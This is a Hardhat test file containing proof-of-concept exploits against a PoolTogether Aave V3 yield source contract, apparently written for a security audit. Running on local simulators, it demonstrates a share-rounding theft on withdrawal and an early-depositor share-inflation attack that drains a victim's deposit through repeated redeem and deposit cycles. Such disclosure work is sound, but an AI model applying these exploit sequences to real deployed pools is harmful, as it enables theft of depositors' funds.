import { Signer } from '@ethersproject/abstract-signer';
import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';

import { expect } from 'chai';
import { BigNumber } from 'ethers';
import { MockContract } from 'ethereum-waffle';
import { network, ethers, waffle } from 'hardhat';

import {
  AaveV3YieldSourceHarness,
  AaveV3YieldSourceHarness__factory,
  ATokenSimulator,
  ERC20Mintable,
  PoolSimulator
} from '../types';

import IAToken from '../abis/IAToken.json';
import IRewardsController from '../abis/IRewardsController.json';
import IPool from '../abis/IPool.json';
import IPoolAddressesProvider from '../abis/IPoolAddressesProvider.json';
import IPoolAddressesProviderRegistry from '../abis/IPoolAddressesProviderRegistry.json';
import SafeERC20Wrapper from '../abis/SafeERC20Wrapper.json';

const { constants, getContractFactory, getSigners, utils } = ethers;
const { AddressZero, MaxUint256 } = constants;
const { parseEther: toWei, parseUnits } = utils;

const DECIMALS = 6;
const REFERRAL_CODE = 188;

describe('AaveV3YieldSource', () => {
  let contractsOwner: Signer;
  let yieldSourceOwner: SignerWithAddress;
  let wallet2: SignerWithAddress;
  let attacker: SignerWithAddress;

  let rewardsController: MockContract;
  let pool: PoolSimulator;
  let poolAddressesProvider: MockContract;
  let poolAddressesProviderRegistry: MockContract;

  let aaveV3YieldSource: AaveV3YieldSourceHarness;

  let usdcToken: ERC20Mintable;
  let aToken: ATokenSimulator;

  let constructorTest = false;

  const deployAaveV3YieldSource = async (
    aTokenAddress: string,
    rewardsControllerAddress: string,
    poolAddressesProviderRegistryAddress: string,
    decimals: number,
    owner: string,
  ): Promise<AaveV3YieldSourceHarness> => {
    const AaveV3YieldSource = (await ethers.getContractFactory(
      'AaveV3YieldSourceHarness',
    )) as AaveV3YieldSourceHarness__factory;

    return await AaveV3YieldSource.deploy(
      aTokenAddress,
      rewardsControllerAddress,
      poolAddressesProviderRegistryAddress,
      'PoolTogether aUSDC Yield',
      'PTaUSDCY',
      decimals,
      owner,
    );
  };

  beforeEach(async () => {
    const { deployMockContract } = waffle;

    [contractsOwner, yieldSourceOwner, wallet2, attacker] = await getSigners();

    const ERC20MintableContract = await getContractFactory('ERC20Mintable', contractsOwner);

    usdcToken = (await ERC20MintableContract.deploy('USD Coin', 'USDC', 6)) as ERC20Mintable;

    const aTokenSimulator = await getContractFactory('aTokenSimulator', contractsOwner);

    //Deploy my own aToken
    aToken = (await aTokenSimulator.deploy('aToken', 'aToken', 18, usdcToken.address)) as ATokenSimulator;

    const PoolSimulator = await getContractFactory('PoolSimulator', contractsOwner);

    pool = (await PoolSimulator.deploy(usdcToken.address, aToken.address)) as PoolSimulator;

    //Start pool off with a bunch of tokens (I am cheating)
    await usdcToken.mint(pool.address, BigNumber.from(10).pow(60));
    await aToken.mint(pool.address, BigNumber.from(10).pow(60));

    rewardsController = await deployMockContract(contractsOwner, IRewardsController);

    poolAddressesProvider = await deployMockContract(contractsOwner, IPoolAddressesProvider);

    poolAddressesProviderRegistry = await deployMockContract(
      contractsOwner,
      IPoolAddressesProviderRegistry,
    );

    await poolAddressesProvider.mock.getPool.returns(pool.address);
    await poolAddressesProviderRegistry.mock.getAddressesProvidersList.returns([
      poolAddressesProvider.address,
    ]);

    aaveV3YieldSource = await deployAaveV3YieldSource(
      aToken.address,
      rewardsController.address,
      poolAddressesProviderRegistry.address,
      DECIMALS,
      yieldSourceOwner.address,
    );

    await aToken.forciblySetApproval(aaveV3YieldSource.address, pool.address, MaxUint256)
  });

  describe('PoolTogether vulnerabilities', () => {

    it.only('Incorrectly rounds down shares burned when withdrawing, leading to a max pool theft per withdraw equal to tokensPerShare - 1. Enter a test amount: ', async () => {
      let testAmount = 2; //For this test, tokens / share = 10 ^ testAmount. Feel free to play around with it.

      //Handle approvals and mint large amounts for user and attacker
      await usdcToken.mint(attacker.address, BigNumber.from(10).pow(60));
      await aToken.mint(attacker.address, BigNumber.from(10).pow(60));
      await usdcToken.mint(wallet2.address, BigNumber.from(10).pow(60));
      await aToken.mint(wallet2.address, BigNumber.from(10).pow(60));

      await usdcToken.connect(attacker).approve(aaveV3YieldSource.address, MaxUint256)
      await usdcToken.connect(attacker).approve(pool.address, MaxUint256)
      await usdcToken.connect(wallet2).approve(aaveV3YieldSource.address, MaxUint256)

        console.log('132')
        let attackerInitialBalance = await usdcToken.balanceOf(attacker.address);
        let victimInitialBalance = await usdcToken.balanceOf(wallet2.address);

        //Deposit 1 wei to get 1 share in return, then deposit a bunch of aToken so that share price goes up.
        console.log('137')
        await aaveV3YieldSource.connect(attacker).supplyTokenTo(1, attacker.address)
        //Set up pool so that each share is worth 10^i tokens
        let attackDepositAmount = BigNumber.from(10).pow(testAmount)
        await pool.connect(attacker).supply(usdcToken.address, attackDepositAmount, attacker.address, 4);

        //Now victim deposits a lot of tokens, the exact amount isn't important as long as it's at least a few shares
        await aaveV3YieldSource.connect(wallet2).supplyTokenTo(BigNumber.from(10).pow(50), wallet2.address)
        console.log('143')

        //Now attacker will simply withdraw 1 share and gain near-double the amount they should from that withdrawal
        await aaveV3YieldSource.connect(attacker).redeemToken(await stealAmountHelper().toString())

        //Final balance for this test
        let attackerFinalBalance = await usdcToken.balanceOf(attacker.address);
        let attackerProfit = (attackerFinalBalance.sub(attackerInitialBalance)).add(attackDepositAmount);
        console.log('Attacker final balance:   ', attackerFinalBalance.toString())
        console.log('Attacker initial balance: ', attackerInitialBalance.toString())
        console.log('Attacker coins spent:     ', attackDepositAmount.toString())
        console.log('At a tokens / share of ', BigNumber.from(10).pow(testAmount).toString(), ', ', attackerProfit.toString(), ' tokens stolen in one iteration');
    })

    //For this test I assume USDC has 18 decimals rather than 6. I'm pretty sure it works either way; just making it easier on myself.
    it('allows easy pool draining if an early depositor ramps up the share price, then rug pulls', async () => {
      const USDC_DECIMALS = 18;
      //Mint 1 share to attacker for 1 wei
      const ATTACKER_STARTING_BAL = BigNumber.from(10).pow(USDC_DECIMALS).mul(100000)
      await usdcToken.connect(attacker).approve(aaveV3YieldSource.address, MaxUint256)
      await usdcToken.mint(attacker.address, ATTACKER_STARTING_BAL)  //Attacker starts with 10,000 USDC (well, not usdc due to decimals, but most other coins)
      await aaveV3YieldSource.connect(attacker).supplyTokenTo(1, attacker.address);

      //Attacker transfers in 10,000 USDC to ramp share value up to 10^22 tokens / share
      await usdcToken.connect(attacker).approve(pool.address, MaxUint256)
      await pool.connect(attacker).supply(usdcToken.address, BigNumber.from(10).pow(USDC_DECIMALS).mul(1000), aaveV3YieldSource.address, 4)

      //Now some poor sap deposits 100,000 USDC
      const USER_STARTING_BAL = BigNumber.from(10).pow(USDC_DECIMALS).mul(100000)
      await usdcToken.mint(wallet2.address, USER_STARTING_BAL)
      await usdcToken.connect(wallet2).approve(aaveV3YieldSource.address, MaxUint256)
      await aaveV3YieldSource.connect(wallet2).supplyTokenTo(USER_STARTING_BAL, wallet2.address)


      //Now at this point I need to call withdraw over and over. If a share is worth 1000 tokens, I redeem 1999 tokens and burn 1 share, then deposit it back and repeat.

      let preExploitAttackerBalance = await usdcToken.balanceOf(attacker.address)
      let preExploitAttackerShares = await aaveV3YieldSource.balanceOf(attacker.address)

      for (let i = 0; i < 10; i++)   {
        //Burn almost 2 shares' worth
        let currentShareValue = await aaveV3YieldSource.sharesToToken(1)
        let amountToBurn = currentShareValue.mul(2).sub(1)

        await aaveV3YieldSource.connect(attacker).redeemToken(amountToBurn)

        let tokensToDeposit = await aaveV3YieldSource.sharesToToken(2)
        //Deposit 2 shares' worth
        await aaveV3YieldSource.connect(attacker).supplyTokenTo(tokensToDeposit.mul(10).div(9), attacker.address)
      }

      //At the end, the attacker should have very slightly less usdc token, but 10 more shares
      let postExploitAttackerBalance = await usdcToken.balanceOf(attacker.address)
      let postExploitAttackerShares = await aaveV3YieldSource.balanceOf(attacker.address)
      console.log('Exploit bal cost USDC: ', (preExploitAttackerBalance.sub(postExploitAttackerBalance)).toString())
      console.log('Exploit share gain in shares: ', (postExploitAttackerShares.sub(preExploitAttackerShares)).toString())

      let tokensPerShare = await aaveV3YieldSource.sharesToToken(1)

      //Let's have attacker withdraw everything to make exploit value a little clearer
      await aaveV3YieldSource.connect(attacker).redeemToken(postExploitAttackerShares.mul(tokensPerShare.add(1)).sub(1))
      console.log('Total profit once everything is sold: ', (await usdcToken.balanceOf(attacker.address)).sub(ATTACKER_STARTING_BAL).toString())
    })
  })

  const stealAmountHelper = async function()   {
    let totalShares = await aaveV3YieldSource.totalSupply()
    let aTokenBalance = await aToken.balanceOf(aaveV3YieldSource.address)
    let pricePerShare = aTokenBalance.mul(BigNumber.from(10).pow(18)).div(totalShares)
    console.log('totalShares:   ', totalShares.toString())
    console.log('aTokenBalance: ', aTokenBalance.toString())
    console.log('pricePerShare: ', pricePerShare.toString())
    console.log('Returning:     ', pricePerShare.mul(2).sub(1).toString())
    return pricePerShare.mul(2).sub(1)
  }
})